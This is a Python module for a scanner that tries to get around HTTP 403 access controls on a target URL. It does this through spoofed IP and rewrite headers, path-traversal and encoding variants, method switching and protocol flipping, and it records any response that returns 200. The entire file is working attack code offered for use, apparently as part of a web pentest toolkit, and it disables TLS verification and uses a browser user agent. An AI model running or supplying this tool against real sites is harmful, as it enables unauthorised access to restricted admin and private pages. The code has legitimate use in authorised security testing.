"""
403 Forbidden bypass scanner module.

Attempts to circumvent 403 responses via header injection, path manipulation,
HTTP method switching, and protocol/case variation. Confirms a bypass when the
original request returns 403 and the modified request returns 200.
"""

import httpx
from typing import Optional

# Header-based bypass payloads — injected one at a time
HEADER_PAYLOADS: list[dict[str, str]] = [
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Proto": "https"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;host=localhost"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Referer": "https://localhost/admin"},
]

# Path manipulation variants — appended / replacing the path segment
def path_variants(path: str) -> list[str]:
    """Generate path manipulation variants for a given path."""
    base = path.rstrip("/")
    return [
        base + "/",
        base + "//",
        base + "/./",
        base + "/%2e/",
        base + "/%252e/",
        base + "/..;/",
        base + "/.json",
        base + ".php",
        "/" + base.lstrip("/").upper(),
        "/" + base.lstrip("/").lower(),
        base.replace("/", "/%2f"),
        base + "?",
        base + "#",
        base + "/..",
        "/%2e" + base,
    ]

# HTTP methods to try when the original 403 was a GET
METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "DELETE"]


class Bypass403:
    """
    Scans a URL for 403 Forbidden bypass opportunities.

    Usage:
        bypass = Bypass403(timeout=10, verbose=True)
        finding = bypass.scan("https://target.com/admin")
    """

    def __init__(self, timeout: int = 10, verbose: bool = False):
        self.timeout = timeout
        self.verbose = verbose
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=False,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
        )

    def _log(self, msg: str):
        if self.verbose:
            print(f"[403] {msg}")

    def _baseline(self, url: str) -> int:
        """Return the baseline status code for the URL."""
        try:
            return self.client.get(url).status_code
        except httpx.RequestError:
            return 0

    def _try_headers(self, url: str) -> Optional[dict]:
        for headers in HEADER_PAYLOADS:
            try:
                resp = self.client.get(url, headers=headers)
                self._log(f"Headers {headers} → {resp.status_code}")
                if resp.status_code == 200:
                    return self._finding(url, "header_injection", str(headers), resp)
            except httpx.RequestError as e:
                self._log(f"Request error: {e}")
        return None

    def _try_paths(self, url: str) -> Optional[dict]:
        parsed = httpx.URL(url)
        base = str(parsed.copy_with(path="", query="", fragment=""))
        path = parsed.path or "/"
        for variant in path_variants(path):
            target = base + variant
            try:
                resp = self.client.get(target)
                self._log(f"Path {variant} → {resp.status_code}")
                if resp.status_code == 200:
                    return self._finding(url, "path_manipulation", variant, resp)
            except httpx.RequestError as e:
                self._log(f"Request error: {e}")
        return None

    def _try_methods(self, url: str) -> Optional[dict]:
        for method in METHODS:
            try:
                resp = self.client.request(method, url)
                self._log(f"Method {method} → {resp.status_code}")
                if resp.status_code == 200:
                    return self._finding(url, "method_switch", method, resp)
            except httpx.RequestError as e:
                self._log(f"Request error: {e}")
        return None

    def _try_protocol(self, url: str) -> Optional[dict]:
        flipped = url.replace("https://", "http://") if url.startswith("https://") \
                  else url.replace("http://", "https://")
        try:
            resp = self.client.get(flipped)
            self._log(f"Protocol flip → {resp.status_code}")
            if resp.status_code == 200:
                return self._finding(url, "protocol_flip", flipped, resp)
        except httpx.RequestError as e:
            self._log(f"Request error: {e}")
        return None

    @staticmethod
    def _finding(url: str, technique: str, payload: str, resp: httpx.Response) -> dict:
        return {
            "type": "403_BYPASS",
            "url": url,
            "technique": technique,
            "payload": payload,
            "bypassed_status": resp.status_code,
            "evidence": resp.text[:300],
        }

    def scan(self, url: str) -> Optional[dict]:
        """
        Attempt to bypass a 403 on the given URL.

        Args:
            url: Target URL expected to return 403.

        Returns:
            Finding dict if bypass confirmed (200 response), None otherwise.
        """
        baseline = self._baseline(url)
        self._log(f"Baseline {url} → {baseline}")
        if baseline != 403:
            self._log(f"Skipping — baseline is {baseline}, not 403")
            return None

        return (
            self._try_headers(url)
            or self._try_paths(url)
            or self._try_methods(url)
            or self._try_protocol(url)
        )

    def close(self):
        self.client.close()

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.close()
